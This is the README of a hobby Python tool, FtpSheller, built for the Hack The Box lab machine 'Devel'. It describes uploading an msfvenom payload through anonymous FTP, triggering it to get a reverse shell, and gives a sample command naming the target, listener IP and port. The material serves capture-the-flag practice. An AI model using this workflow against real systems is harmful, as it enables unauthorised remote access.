# FtpSheller

**What is this?**
I made this script for fun for getting a shell on one of the machines at www.hackthebox.eu called Devel.
It'll check for anonymous login on the FTP server. If that's allowed it'll craft a payload and store it on the FTP server.
Then it'll trigger the payload, returning a shell to you.

There's still a bunch of stuff I'd like to do, so consider this a beta release.

Hit me up on NetSecFocus' slack if you have any suggestions! I'd love to hear them.

**Prerequisites:**
- Python 2.7
- Curl
- Msfvenom


**How to:**
Download nc.py and FtpSheller.py.
Run it by specifying the RHOST, LHOST, LPORT and PayloadType, e.g.:

python FtpSheller.py --rhost 10.10.10.5 --lhost <your IP> --lport 4444 --payloadType aspx

If all goes well you'll be given a reverse shell!

